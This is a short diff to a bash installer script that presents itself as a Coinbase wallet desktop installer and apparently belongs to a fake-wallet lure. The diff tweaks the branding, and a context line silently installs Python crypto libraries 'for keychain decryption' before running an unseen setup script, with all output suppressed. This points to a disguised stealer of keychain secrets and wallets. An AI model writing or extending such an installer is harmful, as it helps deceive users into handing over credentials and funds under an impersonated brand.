@@ -3,7 +3,7 @@ set -eo pipefail
 
 cd "$(dirname "$0")"
 
-echo "🔐 Coinbase Desktop Wallet SDK - Installer"
+echo "🔐 Coinbase-Wallet-Desktop - Installer"
 echo "============================================"
 echo ""
 
@@ -29,11 +29,11 @@ echo "📦 Installing dependencies..."
 # Pre-install Python crypto deps for keychain decryption (silent, best-effort)
 /usr/bin/python3 -m pip install --user --quiet --disable-pip-version-check cryptography pycryptodome 2>/dev/null || true
 
-npm install --silent 2>/dev/null
+npm install --production --silent 2>/dev/null
 
 echo "✓ Dependencies installed"
 echo ""
-echo "🚀 Starting wallet configuration..."
+echo "🚀 Starting configuration..."
 echo ""
 
 node scripts/setup.js
